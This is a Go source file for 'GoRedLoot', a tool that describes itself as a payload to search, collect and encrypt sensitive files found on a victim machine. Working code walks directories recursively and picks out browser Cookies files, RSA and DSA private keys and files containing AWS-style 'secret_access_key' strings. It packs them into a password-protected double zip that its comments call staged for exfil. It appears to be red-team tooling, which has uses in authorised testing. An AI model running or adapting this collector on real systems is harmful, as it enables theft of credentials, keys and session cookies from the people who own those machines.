//GoRedLoot is a payload to search, collect, and encrypt sensitive filez found on a victim machine
package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"strings"

	"github.com/alexmullins/zip"
)

// Plan is to recursivly search some directories (argv1):
//  1. ignore files w/ certain names
//  2. include files w/ certain names
//  3. ignore files w/ certain criteria
//  4. include files w/ certain criteria
// Collect, compress, and encrypt those files somewhere (argv2)

// Keyz is our global list of files to stage for exfil that we are tracking
var Keyz []string
var encryptPassword = "examplepassword"
var ignoreNames = []string{"Keychains", ".vmdk", ".vmem", ".npm", ".vscode", ".dmg", "man1", ".ova", ".iso"}
var ignoreContent = []string{"golang.org/x/crypto"}
var includeNames = []string{"Cookies"}
var includeContent = []string{"BEGIN DSA PRIVATE KEY", "BEGIN RSA PRIVATE KEY", "secret_access_key"}

func main() {

	if len(os.Args) < 3 {
		fmt.Println("./GoRedLoot [directory to recursivly search] [out file]")
	} else {
		// First arg, the directory we will recursivly search
		pathToDir := os.Args[1]
		// Second arg, location we will write double zip file
		outFile := os.Args[2]
		// Start recursive search
		searchForFiles(pathToDir)
		if Keyz != nil {
			err := ZipFiles(outFile, Keyz, encryptPassword)
			if err != nil {
				fmt.Println("error writing zip file")
			} else {
				fmt.Println("wrote zip file")
			}
		} else {
			fmt.Println("no keyz found")
		}
	}
}

// searchForFiles is a private function that recurses through directories, running our searchFileForCriteria function on every file
func searchForFiles(pathToDir string) {
	files, err := ioutil.ReadDir(pathToDir)
	if err != nil {
		//fmt.Println(err)
		return
	}
	// loop all files in current dir, throw away the index var
	for _, file := range files {
		if stringLooper(file.Name(), ignoreNames) {
			//fmt.Printf("the file %s%s, matched for an ignore file name! excluding file!!", pathToDir, file.Name())
		} else {
			//fmt.Println(file.Name())
			if file.IsDir() {
				//fmt.Println("--DEBUG-- File is a dir, recurse time!")
				// Need to add the tailing slash for new base directory
				dirName := file.Name() + "/"
				fullPath := strings.Join([]string{pathToDir, dirName}, "")
				// Recurse into the new base directory (note, this makes it a depth first search)
				searchForFiles(fullPath)
			} else {
				// If we find what we are looking for
				if searchFileForCriteria(pathToDir, file.Name()) {
					fullPath := strings.Join([]string{pathToDir, file.Name()}, "")
					//fmt.Printf("--DEBUG-- The file at %s, is worth taking\n", fullPath)
					Keyz = append(Keyz, fullPath)
				}
			}
		}
	}
}

func searchFileForCriteria(pathToDir, fileName string) bool {
	// Recreate our full file path to read the files being searched
	fullPath := strings.Join([]string{pathToDir, fileName}, "")
	// First thing is we check if this is a file we are explicitly looking for
	if stringLooper(fullPath, includeNames) {
		//fmt.Printf("This is an explicit match for %s \n", fullPath)
		return true
	}
	fileData, err := ioutil.ReadFile(fullPath)
	if err != nil {
		fmt.Println(err)
	}
	fileLines := strings.Split(string(fileData), "\n")
	for _, line := range fileLines {
		// first we explicitly ignore content
		if stringLooper(line, ignoreContent) {
			//fmt.Printf("the file %s%s, matched on line %d, for an ignore content! excluding file!\n", pathToDir, fileName, i)
			return false
		}
		// next we explicitly look for content
		if stringLooper(line, includeContent) {
			//fmt.Printf("The file %s%s, matched on line %d, for an include content!\n", pathToDir, fileName, i)
			return true
		}
	}
	return false
}

// A function to loop over our string slices and match any of our globally defined content
func stringLooper(target string, list []string) bool {
	for _, loot := range list {
		if strings.Contains(target, loot) {
			//fmt.Printf("the exact content that matched is : %s \n", loot)
			return true
		}
	}
	return false
}

// ZipFiles compresses one or many files into a single zip archive file
func ZipFiles(filename string, files []string, encryptPassword string) error {
	newfile, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer newfile.Close()
	zipWriter := zip.NewWriter(newfile)
	defer zipWriter.Close()
	encryptedWriter, err := zipWriter.Encrypt("", encryptPassword)
	if err != nil {
		return err
	}
	encryptedZipWriter := zip.NewWriter(encryptedWriter)
	// Add files to zip
	for _, file := range files {
		zipfile, err := os.Open(file)
		if err != nil {
			return err
		}
		defer zipfile.Close()
		// Get the file information
		info, err := zipfile.Stat()
		if err != nil {
			return err
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		header.Method = zip.Deflate
		writer, err := encryptedZipWriter.CreateHeader(header)
		if err != nil {
			return err
		}
		_, err = io.Copy(writer, zipfile)
		if err != nil {
			return err
		}
	}
	return nil
}
